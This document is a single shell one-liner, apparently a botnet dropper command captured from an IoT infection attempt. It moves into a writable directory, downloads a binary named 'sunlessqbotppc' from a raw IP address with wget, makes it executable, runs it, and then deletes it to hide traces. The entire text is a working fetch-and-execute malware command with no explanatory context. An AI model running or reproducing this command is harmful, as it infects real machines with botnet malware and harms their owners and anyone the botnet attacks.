cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.175.22/sunlessqbotppc; chmod +x sunlessqbotppc; ./sunlessqbotppc; rm -rf sunlessqbotppc
